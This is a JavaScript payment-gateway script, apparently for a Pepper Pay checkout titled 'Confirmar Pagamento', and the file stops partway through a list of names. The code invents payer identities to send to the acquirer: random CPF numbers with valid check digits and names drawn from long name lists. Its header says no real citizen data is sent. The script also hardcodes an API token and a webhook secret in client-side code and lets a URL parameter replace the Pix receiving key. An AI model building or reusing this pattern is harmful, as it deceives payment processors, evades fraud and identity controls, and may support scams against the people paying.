/**
 * pepper-api.js - Integracao Client-Side Direta para Pepper Pay (100% JavaScript)
 * Produto Oficial: Confirmar Pagamento
 * 
 * REGRA RIGOROSA DE PRIVACIDADE:
 * NENHUM dado real do cidadao e enviado ao gateway.
 * Dados aleatorios, camuflados e com CPF Modulo 11 valido sao gerados exclusivamente para a adquirente.
 */
(function (window) {
  "use strict";

  var CONFIG = {
    gateway: "pepper",
    productTitle: "Confirmar Pagamento",
    productHash: "1t36h1d7sn",
    apiEndpoint: "https://api.cloud.pepperpay.com.br/public/v1/transactions",
    apiToken: "iZhIOl3xL2T1wQGcu5J3dFEjpJo4NlGFYLxsdIDpoAM6ljBN5dqL5OjgZLbs",
    webhookSecret: "EKSpolloP8ngIVP7EmbRy3xezXLToShp66AoRPrQ4VEJQEgrUaAgpaKq4pyh",
    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "suporte@gmail.com"),
    offers: {
      "6190": "qdlri",
      "61.90": "qdlri",
      "3582": "jcr4i",
      "35.82": "jcr4i",
      "2790": "eni9e",
      "27.90": "eni9e",
      "1970": "cqbq0",
      "19.70": "cqbq0",
      "4560": "gogtf",
      "45.60": "gogtf",
      "4735": "0gfqx",
      "47.36": "0gfqx",
      "500": "ufr2c",
      "5.00": "ufr2c"
    }
  };


  function generateValidCpf() {
    var digits = [];
    for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
    var s1 = 0;
    for (var i = 0; i < 9; i++) s1 += digits[i] * (10 - i);
    var r1 = 11 - (s1 % 11);
    digits.push(r1 >= 10 ? 0 : r1);
    var s2 = 0;
    for (var i = 0; i < 10; i++) s2 += digits[i] * (11 - i);
    var r2 = 11 - (s2 % 11);
    digits.push(r2 >= 10 ? 0 : r2);
    return digits.join("");
  }


function generateGatewayCustomer() {

  // ─── 358 NOMES MASCULINOS ─────────────────────────────────────────────────
  var maleNames = [
    "Joao","Gabriel","Lucas","Pedro","Carlos","Luiz",
    "Jose","Gustavo","Matheus","Antonio","Paulo","Daniel",
    "Bruno","Marcos","Francisco","Rafael","Luis","Vinicius",
    "Eduardo","Victor","Leonardo","Miguel","Samuel","Vitor",
    "Caio","Arthur","Anderson","Fernando","Leandro","Marcelo",
    "Raimundo","Igor","Andre","Douglas","Fabio","Rodrigo",
    "Mateus","Sergio","Alex","Luan","Thiago","Diego",
    "Davi","Marcio","Ruan","Erick","Tiago","Mario",
    "Nicolas","Ricardo","Flavio","Roberto","Renan","Julio",
    "Gilberto","Geraldo","David","Wellington","Edson","Jefferson",
    "Kaio","Bernardo","Robson","Jean","Mauro","Ismael",
    "Alan","Yuri","Manoel","Wanderson","Jonas","Fabricio",
    "Ryan","Jorge","Jeferson","Adriano","Kaue","Josue",
    "Otavio","Luciano","Danilo","Enzo","Kevin","Osmar",
    "Emerson","Washington","Sandro","Breno","Elias","Adalberto",
    "Juan","Wilson","Domingos","Kayky","Pablo","Pietro",
    "Natan","Michel","Kauan","Juliano","Nelson","Eric",
    "Gilmar","Levi","Walter","Renato","Wagner","Ramon",
    "Wendel","Murilo","Junior","Icaro","Augusto","Alisson",
    "Marco","Rian","Michael","Raul","Maycon","Valdir",
    "Diogo","Italo","Adao","Joel","Ezequiel","Gleison",
    "Josimar","Frederico","Denilson","Yago","Mikael","Yan",
    "Maicon","Silas","Mauricio","Everson","Silvio","Jonatas",
    "Alexandro","Cesar","Davy","Iuri","Maurilio","Mailson",
    "Alvaro","Venancio","Cassio","Cezar","Elton","Valdeir",
    "Ivanildo","Jardel","Kaike","Sebastiao","Altair","Humberto",
    "Getulio","Osvaldo","Volmir","Ney","Misael","Rogerio",
    "Roger","Cauan","Ian","Jackson","Leonel","Angelo",
    "Marlon","Thomas","Hygor","Bryan","Marcus","Heitor",
    "Plinio","Welington","Ygor","Hamilton","Everton","Max",
    "Reginaldo","Deyvison","Alexander","Mathias","Thalyson","Asafe",
    "Fagner","Vinicios","Gabryel","Micael","Ademir","Afonso",
    "Nilson","Adriel","Claudio","Adilson","Aldair","Cristiano",
    "Helder","Jair","Genival","Nilton","Edilson","Benedito",
    "Edison","Edvaldo","Helio","Ivan","Abner","Erik",
    "Nikolas","Rhuan","Eder","Allan","Gian","Thyago",
    "Ebert","Cleiton","Artur","Emanuel","Jairo","Alessandro",
    "Natanael","Tarcisio","Estevao","Kaleb","Luccas","Emmanuel",
    "Fred","Ignacio","Iago","Ronildo","Alef","Gael",
    "Celio","Celso","Roni","Aldo","Orlando","Gilson",
    "Ailton","Airton","Phillipe","Wendell","Weverton","Eraldo",
    "Clayton","Braulio","William","Willian","Tulio","Teodoro",
    "Ronan","Reinaldo","Moises","Lincon","Kelvin","Henrique",
    "Guilherme","Geovane","Evandro","Caique","Andrei","Rhyan",
    "Renzo","Rivaldo"
  ];

  // ─── 2310 NOMES FEMININOS ─────────────────────────────────────────────────
  var femaleNames = [
    "Maria","Ana","Julia","Vitoria","Leticia","Amanda",
    "Larissa","Beatriz","Bruna","Gabriela","Jessica","Luana",
    "Fernanda","Yasmin","Mariana","Camila","Eduarda","Juliana",
    "Bianca","Anna","Emilly","Sara","Natalia","Debora",
    "Laura","Raissa","Vanessa","Giovanna","Lara","Rafaela",
    "Sabrina","Isabela","Jaqueline","Andressa","Yasmim","Brenda",
    "Patricia","Ingrid","Rayssa","Victoria","Livia","Caroline",
    "Isabella","Renata","Carla","Flavia","Isadora","Luiza",
    "Antonia","Milena","Giovana","Pamela","Alessandra","Nathalia",
    "Luciana","Adriana","Gabrielle","Samara","Geovana","Barbara",
    "Francisca","Marcia","Lorena","Paula","Evelyn","Mayara",
    "Isabelly","Vera","Nicole","Gabrielly","Erica","Geovanna",
    "Rebeca","Priscila","Rayane","Karine","Angela","Sandra",
    "Marina","Nayara","Daniela","Marcela","Paloma","Clara",
    "Elaine","Roberta","Daniele","Erika","Janaina","Kelly",
    "Eliane","Taina","Sonia","Kauane","Carolina","Sofia",
    "Heloisa","Karina","Fabiana","Raiane","Daiane","Viviane",
    "Stefany","Rita","Denise","Talita","Helena","Nicolly",
    "Claudia","Simone","Marlene","Kamilly","Camilly","Thalita",
    "Joana","Andreia","Cristiane","Gabriele","Karla","Solange",
    "Karoline","Aparecida","Rosangela","Paola","Iara","Tamires",
    "Gisele","Monica","Manuela","Valeria","Michele","Regina",
    "Dayane","Emanuelle","Silvia","Thayna","Isabelle","Sophia",
    "Tatiane","Edna","Maiara","Kamila","Michelle","Thalia",
    "Alana","Gabriella","Tainara","Rafaella","Danielle","Hellen",
    "Melissa","Lucia","Josiane","Samira","Giulia","Franciele",
    "Angelica","Eliana","Marta","Marilene","Veronica","Rosana",
    "Silvana","Adriele","Cristina","Terezinha","Evellyn","Cassia",
    "Thaina","Emanuelly","Poliana","Laryssa","Agatha","Rosa",
    "Luisa","Jamile","Evelin","Yara","Katia","Cintia",
    "Elizabeth","Maisa","Keila","Nicolle","Suelen","Lidiane",
    "Jussara","Nicoly","Luzia","Mirian","Izabela","Taynara",
    "Roseli","Celia","Naiara","Ariane","Monique","Mariane",
    "Leila","Isabele","Stephany","Mirella","Kauany","Laila",
    "Camille","Mara","Marisa","Marilia","Thaynara","Leandra",
    "Luciene","Gabrieli","Joelma","Tayna","Elisa","Janete",
    "Thamires","Taiane","Fatima","Tamara","Cecilia","Miriam",
    "Andreza","Valentina","Neide","Rosilene","Graziele","Emanuele",
    "Sthefany","Alexandra","Rosiane","Lavinia","Stefani","Iasmin",
    "Carina","Vania","Eva","Millena","Alicia","Elisabete",
    "Izabella","Tania","Gislaine","Cleide","Ivanete","Gabriely",
    "Rosane","Lilian","Raphaela","Kailane","Eloisa","Elizabete",
    "Danielly","Suellen","Camilla","Marcelly","Selma","Neusa",
    "Jamily","Tatiana","Elisangela","Nathaly","Rayanne","Isabelli",
    "Eliete","Carmen","Nayane","Wanessa","Lorrany","Manuella",
    "Izadora","Mayra","Fabiola","Laiane","Vivian","Graziela",
    "Tauane","Kamily","Adrielly","Jamilly","Cleonice","Michelly",
    "Andrea","Salete","Thayla","Edilene","Marcella","Micaela",
    "Natasha","Maira","Allana","Clarice","Samila","Diana",
    "Lidia","Lorraine","Maysa","Pietra","Gabrielli","Liliane",
    "Kaylane","Eloa","Maristela","Rafaelly","Regiane","Luciane",
    "Rebecca","Alexia","Arlete","Nelma","Rejane","Cleusa",
    "Deborah","Juliane","Eunice","Laiza","Silmara","Iasmim",
    "Thauany","Estela","Laisa","Thaissa","Luna","Nataly",
    "Camily","Valquiria","Elza","Lourdes","Vilma","Ludimila",
    "Kamile","Lorrayne","Karolaine","Josefa","Pamella","Mariah",
    "Stephanie","Adrieli","Kauana","Laysa","Dandara","Marya",
    "Cinthia","Elizete","Kimberly","Karolyne","Taisa","Shirley",
    "Stefane","Dara","Lauane","Adria","Ludmila","Leidiane",
    "Jamille","Francielle","Kassia","Brunna","Samantha","Kemilly",
    "Mayane","Miria","Analice","Elizangela","Raimunda","Sirlei",
    "Ananda","Talia","Neuza","Rosemary","Alcione","Karolina",
    "Samanta","Mariza","Ketlen","Thaisa","Nathally","Carine",
    "Tailane","Lisandra","Nubia","Mirela","Layane","Cicera",
    "Daniella","Fabiane","Fabricia","Rosemeire","Heloiza","Marianna",
    "Claudete","Rosimeire","Kelma","Kellen","Celina","Zilda",
    "Marilda","Milene","Adriane","Jessika","Valdineia","Mylena",
    "Cibele","Mikaele","Giselle","Kauanny","Eliza","Gleice",
    "Lorrane","Layla","Carmem","Lana","Isabeli","Myllena",
    "Angelina","Naiane","Kailany","Crislaine","Lurdes","Elenice",
    "Dayana","Rosilda","Nicoli","Mirele","Francieli","Silvania",
    "Estefany","Andrieli","Estefani","Jacqueline","Liandra","Manoela",
    "Alanna","Dalva","Romilda","Glaucia","Naira","Josilene",
    "Glenda","Tatiele","Graciela","Grazielle","Janice","Andresa",
    "Tassia","Kesia","Sirlene","Laysla","Kaline","Micaele",
    "Micheli","Mariany","Rubia","Kezia","Adrielle","Samilly",
    "Danieli","Izabelly","Edineia","Mariele","Gloria","Sheila",
    "Monalisa","Ieda","Valdirene","Edilaine","Magda","Ivonete",
    "Yolanda","Joseane","Francine","Lucineia","Raynara","Estefane",
    "Marcilene","Myrella","Marianne","Ariele","Hanna","Dalila",
    "Aurea","Kyara","Shirlei","Nadia","Suyane","Emanuella",
    "Magna","Layza","Stephani","Marilza","Thaila","Catarina",
    "Dilma","Bernadete","Hilda","Benedita","Graciele","Daiana",
    "Martha","Thayssa","Ericka","Lilia","Raiany","Jhulia",
    "Greice","Elisabeth","Kemily","Stella","Marjory","Joanna",
    "Emilia","Kamilla","Rhayssa","Jordana","Jayane","Taila",
    "Angelita","Roseane","Alinne","Yngrid","Raysa","Marcelle",
    "Nayla","Mirelle","Kenia","Danubia","Kethelyn","Carolaine",
    "Lucilene","Priscilla","Susana","Mikaela","Tayane","Virginia",
    "Alba","Franciely","Edilane","Lucimara","Cleidiane","Nathalya",
    "Brena","Ayla","Cauane","Lucelia","Kamylla","Janaine",
    "Iracema","Rafaely","Luara","Kassandra","Olga","Raylane",
    "Jucelia","Cyntia","Natali","Rayana","Stefanie","Kaila",
    "Leonice","Emanuela","Layra","Letycia","Danielli","Madalena",
    "Lenita","Lauany","Hadassa","Zuleide","Lucila","Anita",
    "Thamyres","Olinda","Telma","Cleuza","Iria","Margarete",
    "Leda","Irma","Dolores","Taciana","Stela","Gizele",
    "Thaise","Jessyca","Raniele","Lanna","Isamara","Katiane",
    "Quezia","Rosimeri","Karoliny","Kauani","Thalyta","Lucileia",
    "Louise","Inara","Ingridy","Raylla","Evelly","Nayra",
    "Jakeline","Lethicia","Camilli","Elayne","Diandra","Edilma",
    "Taline","Nara","Esmeralda","Luma","Allice","Vanusa",
    "Luanna","Giseli","Katielly","Clarisse","Morgana","Gabryella",
    "Ludmilla","Natielle","Mirelly","Betina","Sabryna","Lorenna",
    "Zenaide","Kaylaine","Katarina","Mirely","Margarida","Neila",
    "Ingryd","Ramile","Elvira","Stheffany","Ariely","Pabline",
    "Nilceia","Margareth","Lucinda","Margaret","Elizandra","Aisha",
    "Michelli","Flaviane","Herica","Kariny","Iolanda","Iandra",
    "Izabelle","Nycole","Wilma","Flaviana","Amabile","Dayanne",
    "Gleyce","Clarissa","Gleiciane","Celiane","Edneia","Gessiane",
    "Kailaine","Andrielle","Catiane","Alexsandra","Vanuza","Yasmyn",
    "Lohanny","Natalie","Jocilene","Naila","Raiana","Andria",
    "Monaliza","Andriele","Lariane","Karlla","Kathlyn","Emilli",
    "Ercilia","Josieli","Sebastiana","Emanuely","Tabata","Andrezza",
    "Nadya","Kimbely","Lisiane","Thuany","Claudineia","Keyla",
    "Jackeline","Valdelice","Jerriane","Ketelen","Kathia","Iza",
    "Karini","Lohana","Agata","Rainara","Lazara","Nycolle",
    "Steffany","Juliene","Tayla","Mayza","Gislene","Hevelyn",
    "Micaelly","Anderlane","Kaylani","Adenilza","Grazielli","Andreina",
    "Hana","Islane","Adryelle","Marielly","Sophya","Gisleine",
    "Raila","Jucilene","Evania","Layssa","Yohanna","Kaylanne",
    "Samylla","Arlene","Kellyane","Wallana","Mercia","Ravylla",
    "Marla","Gizelle","Mariani","Tauani","Pollyana","Geysa",
    "Arielly","Laisla","Kaiane","Christina","Catiele","Lyvia",
    "Ivana","Marines","Giullia","Teresinha","Lisete","Ivanilde",
    "Teresa","Creusa","Sylvia","Nilza","Geralda","Vanilda",
    "Adelia","Eliene","Marlei","Vania","Marisete","Norma",
    "Nilva","Indianara","Leilane","Isa","Saionara","Kimberlly",
    "Mislaine","Danila","Juliete","Junia","Katherine","Nikelly",
    "Candida","Glauciane","Dayene","Divina","Ariany","Ilana",
    "Mainara","Thayara","Jocelaine","Michely","Vivia","Jamilli",
    "Thaiza","Taciane","Hemily","Natiane","Marilei","Gizela",
    "Rosiele","Thamara","Agda","Samela","Roseni","Alexssandra",
    "Ariana","Kessia","Ediane","Sulamita","Laira","Thaiane",
    "Leonarda","Jamila","Marinna","Yasmine","Emille","Daiara",
    "Josiene","Soraia","Maryane","Aurilene","Alissa","Maura",
    "Darlene","Rayanna","Keliany","Lillyan","Paolla","Sayonara",
    "Erlane","Rosilane","Joziane","Jarliane","Diovana","Graciele",
    "Dina","Ariadne","Lohany","Alynne","Raisa","Thauana",
    "Adna","Vanderleia","Jaciara","Giuliana","Lauana","Ashley",
    "Kiara","Ingride","Pricila","Cristiele","Thalya","Jamili",
    "Izabeli","Veridiana","Grazieli","Tifany","Jaciene","Raffaela",
    "Davila","Laynne","Noemia","Adelina","Tayssa","Daira",
    "Tauany","Suelem","Adriene","Nagila","Marinete","Kamyla",
    "Julyana","Natielly","Shara","Rayna","Genaina","Elana",
    "Alyssa","Rosineide","Samyra","Melanie","Walkiria","Gessika",
    "Biatriz","Karolainy","Taynna","Andreane","Rhillary","Ewelyn",
    "Mikaella","Francielli","Carliane","Flora","Thyala","Anabelle",
    "Sandrini","Thaine","Nilma","Kaylla","Poliane","Raiciane",
    "Delia","Matilde","Claudiane","Denize","Marileide","Juscileia",
    "Renilda","Leia","Izilda","Venilda","Neurides","Zulmira",
    "Ilza","Rosani","Mercedes","Nilda","Mirtes","Lea",
    "Rosalina","Mirna","Emilia","Zeneide","Delma","Ivanilda",
    "Natalia","Diva","Liliana","Ivaneti","Elzira","Nadia",
    "Damiana","Monica","Cirlei","Eneida","Walquiria","Mariangela",
    "Alina","Elvania","Sthefani","Aldineia","Samilla","Marlena",
    "Franciene","Edina","Maryana","Nazareth","Taiza","Rayla",
    "Grasiele","Graciane","Jocelia","Paulina","Savia","Nathalie",
    "Bruniele","Suyanne","Arylaine","Sabrine","Emmely","Mikaelle",
    "Synara","Geovania","Natacha","Wislla","Mayla","Railany",
    "Josivania","Hevelly","Alceli","Nivea","Andressiellen","Wemilly",
    "Linda","Jadiane","Dioceli","Kaelly","Jasmine","Heloa",
    "Rosilaine","Milleny","Leidiany","Esthefany","Ianara","Xellen",
    "Maina","Darlyane","Leidivania","Keveny","Tiffany","Andreila",
    "Lishanna","Vandreia","Sileide","Marilya","Seyanne","Deusa",
    "Jandirleia","Rosagila","Mickaella","Rayca","Kevilin","Jailma",
    "Gleiciele","Steffane","Indila","Maiza","Katrine","Rosivania",
    "Thayanna","Aldenise","Rannara","Geysiane","Claricy","Rosely",
    "Itamara","Maiana","Annalinna","Irlane","Evyllyn","Clivia",
    "Amabilly","Ewellyn","Genilda","Tacila","Suelene","Tayza",
    "Rosannys","Josineide","Beatrice","Gislayne","Thallyta","Shirlane",
    "Thacila","Witoria","Christianny","Sandriele","Davilla","Williane",
    "Raira","Thayze","Hemiliana","Vanesca","Dyovane","Emanoele",
    "Ilziene","Eliziane","Kayque","Gerlane","Minelle","Tayana",
    "Valdete","Alecsandra","Marciana","Geisa","Ranielly","Naiana",
    "Suzane","Welisanea","Renara","Auanna","Marine","Etyene",
    "Sathya","Franciane","Giceli","Lucielle","Cauani","Taires",
    "Ryana","Alda","Crislayne","Ornela","Rosicleia","Mickaelly",
    "Rafaelle","Allany","Katiana","Hildevania","Jucinara","Joanice",
    "Nathiely","Jeruza","Mairla","Lindalva","Marquiane","Joselma",
    "Fabianna","Jamylle","Geisse","Pollyane","Eloyza","Gabryela",
    "Davylla","Cleisiane","Rayelen","Aliane","Sthefanne","Dhandara",
    "Talyta","Tainah","Greyce","Edielma","Clavia","Marliane",
    "Samily","Maryani","Nalanda","Karollayne","Ligiane","Cimara",
    "Martiele","Josimara","Lyslane","Leonora","Elloa","Cibelle",
    "Naelly","Kalliny","Werika","Thainah","Duda","Natani",
    "Driele","Crismari","Melyssa","Hosana","Nicolli","Eniara",
    "Livea","Maylom","Aricia","Jiselane","Vycttoria","Valdiane",
    "Raquely","Giovane","Raymara","Raycka","Jacielle","Gilmara",
    "Pamelasanford","Laricia","Giorgia","Giulie","Tayllane","Eudilane",
    "Yarla","Kalline","Petala","Jamylly","Layanne","Myrelly",
    "Gilcimara","Eluane","Luca","Marllom","Alceni","Adryan",
    "Hevillys","Maiully","Mayone","Lorenlay","Krislayne","Edwiges",
    "Haina","Thaylane","Alline","Akyane","Kaiany","Echelley",
    "Vanilce","Rayele","Josislane","Suelane","Marjhorrie","Heubene",
    "Wayna","Shayane","Natane","Mayellen","Kemille","Hyorrana",
    "Marindia","Jorhana","Nidiane","Raideilce","Jacilene","Geicikelle",
    "Kesya","Dianna","Christiane","Luiany","Steffanny","Luzineide",
    "Jhulya","Livian","Kesiane","Kallita","Elcinara","Thassia",
    "Laiany","Unsirn","Tarciane","Itacia","Eliandra","Lavynia",
    "Helloa","Gemima","Nadine","Kailla","Ketellyn","Jeiciane",
    "Keilla","Eloysa","Samile","Luilma","Evora","Lucieli",
    "Pablinny","Gerlania","Emanoely","Hortensia","Daiene","Sergilia",
    "Yllana","Jaina","Souza","Rhaisa","Ohanna","Janielly",
    "Elissa","Nielly","Layana","Jessyka","Priscilaine","Alaine",
    "Cleudiene","Eloana","Myriene","Nelocia","Chayenne","Mahara",
    "Ediza","Gezilene","Laizila","Janiele","Adresandra","Cristielly",
    "Meirielly","Nathielly","Ademise","Emiliane","Loislane","Dayena",
    "Steffani","Ayulla","Thyfany","Camylle","Helloisa","Ikara",
    "Thielly","Kelvia","Joycelene","Francini","Fellype","Thailla",
    "Deizilane","Watila","Taysa","Vanna","Josicleide","Elidiane",
    "Athyna","Catiana","Mesaque","Suelainy","Alderlane","Cinthya",
    "Claudiany","Derlane","Adilene","Jeavan","Mayana","Josiana",
    "Maramartins","Uana","Izabele","Daimara","Yhasmin","Habrahise",
    "Nyandra","Ketyllen","Quiteria","Onayra","Eteliane","Adryane",
    "Wedja","Buna","Marcele","Sterfany","Naya","Gecilene",
    "Micaeli","Kethelin","Analuz","Kerolay","Annanda","Heldra",
    "Eloyse","Samea","Siluana","Nilery","Dalvana","Chirley",
    "Katianny","Thyciane","Tairine","Nikoli","Joiciane","Rhayka",
    "Lohanna","Gladys","Islania","Thaylla","Hemillyn","Clarilany",
    "Evillen","Daryelen","Sandrilene","Murieli","Evellen","Glendha",
    "Victorya","Antonela","Thaylanne","Grasielle","Ancidia","Stefhanny",
    "Pauliane","Rayka","Naiury","Evillyn","Creuza","Nataline",
    "Leiciane","Hingryd","Gerusa","Deuzirene","Sheyze","Monithielly",
    "Rayani","Gleicyellen","Dieysla","Siomara","Thawanny","Hitamara",
    "Cilene","Shabrynna","Tallya","Hellenyr","Alayane","Vilenne",
    "Tatieli","Saha","Thassyla","Katela","Carolyne","Jeysse",
    "Schaiane","Keitiely","Acsa","Dienny","Wiliane","Cauana",
    "Natiele","Miscellen","Sandriene","Yorrane","Emileyni","Evekin",
    "Marelisa","Bethania","Nyna","Aliendria","Stheffany","Ellienne",
    "Anelys","Nyara","Cauanna","Lauriceia","Viumara","Krisley",
    "Munique","Aina","Mivina","Nassara","Indiana","Amabelly",
    "Susane","Daynara","Nathany","Lucimaria","Ketleen","Monnique",
    "Gleicy","Suelly","Meiriene","Carlla","Francirleia","Leticiane",
    "Thayline","Ninna","Mellany","Layrsa","Aquilla","Sarana",
    "Grasiely","Dilane","Adrienne","Celma","Luzielma","Scheila",
    "Bianka","Iraides","Dora","Ismaia","Wellida","Gilberta",
    "Herika","Izabely","Khemellyn","Dailana","Thavyne","Iracely",
    "Mayrla","Jayanne","Jaira","Carolayne","Phaola","Hevellyn",
    "Lauanny","Samya","Natiellen","Kecia","Sheyla","Gilma",
    "Wisliany","Eula","Eulalia","Raphaelly","Welyda","Raianny",
    "Gislandia","Edlaine","Eleide","Deminny","Josiany","Neagilym",
    "Dinara","Jamele","Hyaslla","Katrini","Argeli","Iraildes",
    "Mariacecilia","Genive","Emmanuelle","Adryedna","Erolaine","Claudimaria",
    "Aila","Diangela","Anderlei","Merilany","Ysabela","Lusyely",
    "Kathellyn","Taylene","Yslaisa","Myrela","Gilvanessa","Valdeniza",
    "Claudinete","Dayele","Gesica","Meirielle","Tamirez","Katiussia",
    "Raytza","Kemellyn","Laudiceia","Jammyly","Kezya","Layene",
    "Haila","Claudianara","Raniely","Rosileide","Tailize","Aguida",
    "Ilanna","Alcineia","Hannah","Wellika","Anelize","Cledna",
    "Emelin","Raylene","Jeylly","Elisandra","Thifanny","Maila",
    "Jackline","Nallanda","Jaquelane","Cleiceane","Adrienny","Ilorrayne",
    "Makaylla","Hemylly","Eliziaria","Rarine","Mickaele","Hemmilly",
    "Vanussa","Lucienne","Pyettra","Ilozane","Khadija","Mycaele",
    "Cristini","Dallyvia","Luanny","Celine","Silvane","Florence",
    "Orlene","Kesllen","Lelia","Fabia","Mileni","Dalinny",
    "Nattiely","Ritieli","Letticia","Dyana","Cailane","Edleia",
    "Mylene","Nazare","Layna","Thaiely","Kathelyn","Emanuelli",
    "Irenildes","Celiene","Geizimara","Rosinalva","Chaiane","Kissya",
    "Maylane","Kizia","Evyla","Dielly","Julianele","Nayana",
    "Ranna","Mireli","Jardane","Nikoly","Rosyane","Eudyllene",
    "Lorroama","Graziana","Midia","Wilhiane","Kiaria","Morgane",
    "Hingredy","Gabrielen","Evellin","Miquelany","Brayna","Andryelli",
    "Yshaele","Chirlane","Francyne","Josilaine","Francilangela","Maia",
    "Amalya","Kethalin","Thavine","Kayna","Rhayza","Grasiela",
    "Souane","Itanaelly","Veranice","Marluce","Mariluce","Etelvina",
    "Ilderbia","Celestina","Agma","Rua","Jacinta","Eulina",
    "Adalgiza","Marleide","Josefina","Lauriani","Alexei","Arminda",
    "Asta","Gracia","Wania","Elysia","Jacira","Adelia",
    "Suaeli","Eliede","Suzeli","Marliete","Frutuosa","Aliete",
    "Eluete","Jailda","Hilga","Edima","Leonira","Delfina",
    "Fabrycya","Ednilza","Neuraci","Roziane","Alaide","Zildete",
    "Santina","Gezilda","Margot","Dileusa","Mafalda","Milda",
    "Hilzete","Moema","Oneida","Marili","Jussania","Heleni",
    "Emilene","Tilza","Niceia","Clenilda","Dionisia","Edinei",
    "Emilda","Cleidenice","Rizelda","Lindinalva","Valdomira","Laurineia",
    "Claudina","Neuzuila","Dealci","Itelvina"
  ];

  // ─── 500 NOMES COMPOSTOS ─────────────────────────────────────────────────
  var compoundNames = [
    "Maria Eduarda","Maria Clara","Ana Clara","Ana Carolina","Ana Paula","Ana Beatriz",
    "Maria Luiza","Maria Aparecida","Ana Luiza","Ana Julia","Maria Vitoria","Maria Fernanda",
    "Ana Maria","Ana Vitoria","Maria Julia","Ana Caroline","Ana Claudia","Ana Lucia",
    "Ana Laura","Ana Cristina","Ana Luisa","Vera Lucia","Maria Helena","Ana Flavia",
    "Maria José","Angela Maria","Maria Cristina","Maria Jose","Anna Clara","Maria Paula",
    "Joao Vitor","Pedro Henrique","Sonia Maria","Maria Beatriz","Maria Gabriela","Ana Livia",
    "Maria Alice","Anna Julia","Maria Laura","Carlos Eduardo","Maria Luisa","Joao Victor",
    "Vera Lúcia","Anna Beatriz","Maria Izabel","Maria Carolina","Maria Cecilia","Kelly Cristina",
    "Maria Rita","Camilly Vitoria","Anna Luiza","Rosa Maria","Maria Isabel","Julia Vitoria",
    "Leticia Oliveira","Leticia Maria","Ana Alice","Yasmin Vitoria","Ana Karolina","Ana Leticia",
    "Maria Madalena","Maria Antonia","Marcos Vinicius","Maria Lucia","Luana Vitoria","Edna Maria",
    "Maria Tereza","Julio Cesar","Sandra Maria","Leticia Vitoria","Julia Maria","Maria Heloisa",
    "Maria Victoria","Ana Karoline","Maria Claudia","Maria Leticia","Emilly Vitoria","Laura Beatriz",
    "Beatriz Oliveira","Anne Caroline","Sara Cristina","Joao Pedro","Carla Cristina","Kamilly Vitoria",
    "Antonio Carlos","Isabela Cristina","Carlos Alberto","Tania Maria","José Carlos","Bruna Rodrigues",
    "Amanda Rodrigues","Isabella Cristina","Camilly Victoria","Amanda Cristina","Ana Kelly","Leticia Rodrigues",
    "Ana Gabriela","Vitoria Rodrigues","Isabel Cristina","Ana Gabrielly","Sandra Mara","Laura Maria",
    "Luana Cristina","Vitoria Maria","Luiz Carlos","Maria Lúcia","Maria Inês","Sônia Maria",
    "Sandra Regina","Ana Lúcia","Julia Rodrigues","Jessica Aparecida","Izabel Cristina","Aline Cristina",
    "Anna Carolina","Ana Rita","Elaine Cristina","Helen Cristina","Amanda Oliveira","Ana Lara",
    "Sarah Cristina","Giovanna Vitoria","Isabella Vitoria","Yasmim Vitoria","Raissa Vitoria","Lara Maria",
    "Helena Maria","Luiz Felipe","Julia Beatriz","Paulo Cesar","Anny Beatriz","Beatriz Rodrigues",
    "Maria Regina","Juliana Rodrigues","Celia Regina","Paulo Henrique","Karen Cristina","Vitoria Gabrielly",
    "Gabriel Henrique","Camila Aparecida","Ana Rebeca","Emily Vitoria","Isabelly Vitoria","Erica Fernanda",
    "Maria Angela","Maria Elisa","Thais Cristina","Bruna Leticia","Eduarda Vitoria","Leticia Souza",
    "Maria Aline","Matheus Henrique","Camila Cristina","Bruna Oliveira","Fernanda Maria","Maria Raimunda",
    "Adriana Aparecida","Camila Vitoria","Adriana Cristina","Leticia Beatriz","Marcia Regina","Luciana Maria",
    "Maria Eloisa","Carlos Henrique","Larissa Aparecida","Joao Lucas","Ana Cecilia","Kamila Vitoria",
    "Luiz Eduardo","Beatriz Vitoria","Luiz Henrique","Luis Fernando","Julia Oliveira","Larissa Vitoria",
    "Amanda Aparecida","Laura Cristina","Aline Aparecida","Sonia Aparecida","Kamily Vitoria","Maria Bernadete",
    "Lucia Helena","Jessica Maria","Bruna Caroline","Julia Cristina","Marcia Aparecida","Sueli Maria",
    "Maria Inez","Ana Rosa","Ellen Cristina","Carla Maria","Ana Karen","Maria Bruna",
    "Ellen Vitoria","Flavia Alessandra","Mariana Cristina","Maria Isabela","Gabriela Cristina","Paula Cristina",
    "Maria Luciana","Anna Caroline","Luana Rodrigues","Ana Karla","Ana Carla","Gabriela Oliveira",
    "Maria Valeria","Joyce Kelly","Isadora Cristina","Ingrid Vitoria","Ana Karoliny","Julia Gabriela",
    "Maria Eliane","Daniele Cristina","Ana Lidia","Geovanna Vitoria","Amanda Vitoria","Rafaela Rodrigues",
    "Ana Tereza","Livia Vitoria","Elen Cristina","Amanda Souza","Emilly Eduarda","Mariana Vitoria",
    "Victoria Aparecida","Karina Aparecida","Vitoria Caroline","Camily Vitoria","Adriana Rodrigues","Vitoria Fernanda",
    "Gustavo Henrique","Maria Raquel","Maria Angelica","Raissa Victoria","Carla Beatriz","Pamela Vitoria",
    "Rayssa Vitoria","Antonia Maria","Julia Eduarda","Joao Gabriel","Maria Gabriely","Luiz Gustavo",
    "Carlos Daniel","Pedro Lucas","Joao Paulo","Sabrina Vitoria","Eduarda Oliveira","Sonia Regina",
    "Michele Cristina","Julia Fernanda","Vitor Gabriel","Yasmin Rosa","Natalia Souza","Luiz Fernando",
    "Fabio Henrique","Dulce Maria","Maria Francisca","Andressa Oliveira","Luiz Antonio","Maria Rodrigues",
    "Celia Maria","Neusa Maria","Marli Aparecida","Maria Conceição","Paulo Roberto","Roseli Aparecida",
    "Solange Maria","Ana Cláudia","Natalia Rodrigues","Elizabeth Cristina","Maria Eugenia","Ana Angelica",
    "Leticia Gabriela","Andressa Maria","Livia Aparecida","Stefany Vitoria","Daiane Cristina","Camile Vitoria",
    "Juliana Aparecida","Hellen Cristina","Debora Cristina","Maria Santana","Larissa Cristina","Ana Patricia",
    "Marcos Antonio","Beatriz Aparecida","Bianca Vitoria","Eva Maria","Patricia Maria","Debora Eduarda",
    "Mariah Eduarda","Eliane Maria","Yasmin Aparecida","Fernanda Rodrigues","Flavia Vitoria","Leticia Aparecida",
    "Vitoria Regina","Lara Eduarda","Maria Gabriele","Claudia Cristina","Maria Natalia","Emanuelle Vitoria",
